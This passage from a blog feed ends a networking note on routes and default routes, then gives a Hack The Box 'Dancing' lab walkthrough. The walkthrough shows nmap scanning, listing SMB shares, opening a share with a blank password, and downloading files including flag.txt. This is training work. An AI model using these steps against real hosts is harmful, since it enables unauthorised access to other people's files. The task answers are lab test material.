<h3 id="what-exactly-is-a-route">What exactly is a route?</h3>
<hr>
<p>Basically, it&rsquo;s an instruction to the router.</p>
<p>A route tells the router:</p>
<ul>
<li>To send a packet to destination X, you should send the packet to next-hop Y.</li>
<li>or, if the destination is directly connected to the router, send the packet directly to the destination.</li>
<li>or, if the destination is the router&rsquo;s own IP address, receive the packet for yourself (don&rsquo;t forward it).</li>
</ul>
<p>Also, there are few types of routes found in routing tables.</p>
<ol>
<li><code>Connected routes</code></li>
<li><code>Local routes</code></li>
</ol>
<p><code>Connected Routes</code></p>
<ul>
<li>These are routes that are directly connected to a router&rsquo;s interface.</li>
<li>they are automatically created when an interface is configured with an IP address and brought up. Connected routes are essential for a router to communicate with devices on the directly attached network.</li>
</ul>
<p><code>Local Routes</code></p>
<ul>
<li>These are routes to the IP addresses assigned to the router&rsquo;s own interfaces.</li>
<li>Local routes are used to specify that the router can directly reach its own IP addresses. They have the highest priority in the routing table since the router must be able to communicate with its own interfaces.</li>
<li><code>/32</code> netmask is used to specify the exact IP address of the interface.</li>
</ul>
<p>There&rsquo;s a special kind of static route called a <code>default route</code>.</p>
<p>This is a route that you configure inside the router that says, if nothing else matches inside of our routing table, send the traffic this way.</p>
<p>It&rsquo;s also known as the &ldquo;gateway of last resort&rdquo;</p>
<p>A default route is a route to <code>0.0.0.0/0</code></p>
<ul>
<li><code>/0</code> means that all bits of the netmask are 0, so none of the bits of the addresses are fixed. They can all change to be either 0 or 1.</li>
<li><code>0.0.0.0/0</code> is the least specific route possible; it includes every possible destination IP address.</li>
<li>If the router doesn&rsquo;t have any more specific routes that match a packet&rsquo;s destination IP address, the router will forward the packet using the default route.</li>
</ul>
<ul>
<li>A default route is often used to direct traffic to the Internet.
<ul>
<li>More specific routes are used for destinations in the internal corporate network.</li>
<li>Traffic to destinations outside of the internal network is sent to the Internet.</li>
</ul>
</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Dancing</title>
      <link>http://localhost:1313/htb-dancing/</link>
      <pubDate>Mon, 17 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-dancing/</guid>
      <description>Hack The Box starting point, tier 0, very easy, #3 machine: Dancing. Lets&amp;rsquo; go!
TASK 1 What does 3-letter acronym SMB stand for?
Server Message Block SMB protocol implements an application-layer network protocol used to access resources on a server, such as file shares and shared printers.
TASK 2 What port does SMB use to operate at?
445 When I researched about SMB, I found that SMB uses either IP port 139 or 445.</description>
      <content:encoded><![CDATA[<blockquote>
<p><em>Hack The Box</em> starting point, tier 0, very easy, #3 machine: Dancing.
Lets&rsquo; go!</p>
</blockquote>
<p><img src="./lets_go.gif" alt="lets_go"></p>
</br>
<h5 id="task-1">TASK 1</h5>
<p>What does 3-letter acronym SMB stand for?</p>






<pre tabindex="0"><code>Server Message Block</code></pre>
<p>SMB protocol implements an application-layer network protocol used to access resources on a server, such as file shares and shared printers.</p>
</br>
<h5 id="task-2">TASK 2</h5>
<p>What port does SMB use to operate at?</p>






<pre tabindex="0"><code>445</code></pre>
<p>When I researched about SMB, I found that SMB uses either IP port 139 or 445.</p>
<p>Port 139: SMB originally ran on top of NetBIOS using port 139. NetBIOS is an old transport layer that allows Windows computers to talk to each other on the same network.
Port 445: Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack. Using TCP allows SMB to work over the internet.</p>
</br>
<h5 id="task-3">TASK 3</h5>
<p>what is the service name for port 445 that came up in our Nmap scan?</p>






<pre tabindex="0"><code>microsoft-ds</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-bozzgppq95<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sC -sV 10.129.1.12
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.93 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-17 17:42 BST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.1.12
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.027s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">997</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>conn-refused<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>135/tcp open msrpc Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>139/tcp open netbios-ssn Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>445/tcp open microsoft-ds?
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span></code></pre></div>
</br>
<h5 id="task-4">TASK 4</h5>
<p>What is the &lsquo;flag&rsquo; or &lsquo;switch&rsquo; that we can use with the smbclient utility to &rsquo;list&rsquo; the available shares on Dancing?</p>






<pre tabindex="0"><code>-L</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-bozzgppq95<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ smbclient --help
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Usage: smbclient <span style="color:#89dceb;font-weight:bold">[</span>OPTIONS<span style="color:#89dceb;font-weight:bold">]</span> service &lt;password&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>-M, --message<span style="color:#89dceb;font-weight:bold">=</span>HOST Send message
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>-I, --ip-address<span style="color:#89dceb;font-weight:bold">=</span>IP Use this IP to connect to
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>-E, --stderr Write messages to stderr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>instead of stdout
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>-L, --list<span style="color:#89dceb;font-weight:bold">=</span>HOST Get a list of shares available
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>on a host
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>-T, --tar<span style="color:#89dceb;font-weight:bold">=</span>&lt;c|x&gt;IXFvgbNan Command line tar
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>-D, --directory<span style="color:#89dceb;font-weight:bold">=</span>DIR Start from directory
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>-c, --command<span style="color:#89dceb;font-weight:bold">=</span>STRING Execute semicolon separated
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>commands
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>-b, --send-buffer<span style="color:#89dceb;font-weight:bold">=</span>BYTES Changes the transmit/send buffer
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>-t, --timeout<span style="color:#89dceb;font-weight:bold">=</span>SECONDS Changes the per-operation
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>timeout
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>-p, --port<span style="color:#89dceb;font-weight:bold">=</span>PORT Port to connect to
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>-g, --grepable Produce grepable output
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>-q, --quiet Suppress <span style="color:#89dceb">help</span> message
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>-B, --browse Browse SMB servers using DNS</span></span></code></pre></div>
</br>
<h5 id="task-5">TASK 5</h5>
<p>How many shares are there on Dancing?</p>






<pre tabindex="0"><code>4</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-bozzgppq95<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ smbclient -L 10.129.1.12
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Password <span style="color:#cba6f7">for</span> <span style="color:#89dceb;font-weight:bold">[</span>WORKGROUP<span style="color:#89b4fa">\l</span>eewookb<span style="color:#89dceb;font-weight:bold">]</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>    Sharename       Type      Comment
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>    ---------       ----      -------
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>    ADMIN$          Disk      Remote Admin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>    C$              Disk      Default share
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>    IPC$            IPC       Remote IPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>    WorkShares      Disk
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>SMB1 disabled -- no workgroup available</span></span></code></pre></div>
</br>
<h5 id="task-6">TASK 6</h5>
<p>What is the name of the share we are able to access in the end with a blank password?</p>






<pre tabindex="0"><code>WorkShares</code></pre>
<p>Running the <code>smbclient -L 10.129.1.12</code> command, we can see that four separate shares are displayed. The default administrative shares often include the $ symbol at the end of their name to indicate they are hidden shares. As we can see that <code>ADMIN$</code> , <code>C$</code>, <code>IPC$</code> shares all include the symbol at the end. On the other hand, <code>WorkShares</code> share does not include this symbol, which is an indicator that it is a user-created, or custom, share.</p>
</br>
<h5 id="task-7">TASK 7</h5>
<p>What is the command we can use within the SMB shell to download the files we find?</p>






<pre tabindex="0"><code>get</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-bozzgppq95<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ smbclient <span style="color:#89b4fa">\\\\</span>10.129.1.12<span style="color:#89b4fa">\\</span>WorkShares
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Password <span style="color:#cba6f7">for</span> <span style="color:#89dceb;font-weight:bold">[</span>WORKGROUP<span style="color:#89b4fa">\l</span>eewookb<span style="color:#89dceb;font-weight:bold">]</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>Try <span style="color:#a6e3a1">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>smb: <span style="color:#89b4fa">\&gt;</span> ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>. D <span style="color:#fab387">0</span> Mon Mar <span style="color:#fab387">29</span> 09:22:01 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>.. D <span style="color:#fab387">0</span> Mon Mar <span style="color:#fab387">29</span> 09:22:01 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>Amy.J D <span style="color:#fab387">0</span> Mon Mar <span style="color:#fab387">29</span> 10:08:24 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span>James.P D <span style="color:#fab387">0</span> Thu Jun <span style="color:#fab387">3</span> 09:38:03 <span style="color:#fab387">2021</span></span></span></code></pre></div>
<p>In order to connect to the custom share, <code>WorkShares</code> , we need to specify the target&rsquo;s IP address and the target SMB share. The command is <code>smbclient \\\\{target_IP}\\{target_share}</code>.</p>
<ul>
<li>The double backslashes (&rsquo;\\&rsquo;) are used to escape the backslashes in the path.</li>
<li>The path <code>{target_IP}\\WorkShares</code> refers to the &ldquo;WorkShares&rdquo; share on the machine identified by &lsquo;{target_IP}&rsquo;</li>
<li>We were able to connect to the custom share and I used the command ls to list all of the contents of the directories within the share. The command showed us two directories, one is <code>Amy.J</code> and another is <code>James.P</code> .</li>
</ul>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>smb: <span style="color:#89b4fa">\&gt;</span> <span style="color:#89dceb">cd</span> Amy.J
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>smb: <span style="color:#89b4fa">\A</span>my.J<span style="color:#89b4fa">\&gt;</span> ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>. D <span style="color:#fab387">0</span> Mon Mar <span style="color:#fab387">29</span> 10:08:24 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>.. D <span style="color:#fab387">0</span> Mon Mar <span style="color:#fab387">29</span> 10:08:24 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>worknotes.txt A <span style="color:#fab387">94</span> Fri Mar <span style="color:#fab387">26</span> 11:00:37 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>    <span style="color:#fab387">5114111</span> blocks of size 4096. <span style="color:#fab387">1733826</span> blocks available
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>smb: <span style="color:#89b4fa">\A</span>my.J<span style="color:#89b4fa">\&gt;</span> get worknotes.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>getting file <span style="color:#89b4fa">\A</span>my.J<span style="color:#89b4fa">\w</span>orknotes.txt of size <span style="color:#fab387">94</span> as worknotes.txt <span style="color:#89dceb;font-weight:bold">(</span>2.2 KiloBytes/sec<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">(</span>average 2.2 KiloBytes/sec<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>smb: <span style="color:#89b4fa">\A</span>my.J<span style="color:#89b4fa">\&gt;</span> <span style="color:#89dceb">cd</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>smb: <span style="color:#89b4fa">\&gt;</span> ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>. D <span style="color:#fab387">0</span> Mon Mar <span style="color:#fab387">29</span> 09:22:01 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>.. D <span style="color:#fab387">0</span> Mon Mar <span style="color:#fab387">29</span> 09:22:01 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>Amy.J D <span style="color:#fab387">0</span> Mon Mar <span style="color:#fab387">29</span> 10:08:24 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>James.P D <span style="color:#fab387">0</span> Thu Jun <span style="color:#fab387">3</span> 09:38:03 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>    <span style="color:#fab387">5114111</span> blocks of size 4096. <span style="color:#fab387">1733810</span> blocks available
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>smb: <span style="color:#89b4fa">\&gt;</span> <span style="color:#89dceb">cd</span> James.P<span style="color:#89b4fa">\
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span><span style="color:#89b4fa"></span>smb: <span style="color:#89b4fa">\J</span>ames.P<span style="color:#89b4fa">\&gt;</span> ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>. D <span style="color:#fab387">0</span> Thu Jun <span style="color:#fab387">3</span> 09:38:03 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>.. D <span style="color:#fab387">0</span> Thu Jun <span style="color:#fab387">3</span> 09:38:03 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>flag.txt A <span style="color:#fab387">32</span> Mon Mar <span style="color:#fab387">29</span> 10:26:57 <span style="color:#fab387">2021</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>    <span style="color:#fab387">5114111</span> blocks of size 4096. <span style="color:#fab387">1733785</span> blocks available
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>smb: <span style="color:#89b4fa">\J</span>ames.P<span style="color:#89b4fa">\&gt;</span> get flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>getting file <span style="color:#89b4fa">\J</span>ames.P<span style="color:#89b4fa">\f</span>lag.txt of size <span style="color:#fab387">32</span> as flag.txt <span style="color:#89dceb;font-weight:bold">(</span>0.7 KiloBytes/sec<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">(</span>average 1.5 KiloBytes/sec<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>smb: <span style="color:#89b4fa">\J</span>ames.P<span style="color:#89b4fa">\&gt;</span></span></span></code></pre></div>
<p>I used <code>cd</code> command to visit Amy.J folder and found &lsquo;worknotes.txt&rsquo; file, which we can download using the <code>get</code> command. Also we moved inside the James.P directory as well and downloaded the flag.txt file.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>smb: <span style="color:#89b4fa">\J</span>ames.P<span style="color:#89b4fa">\&gt;</span> quit
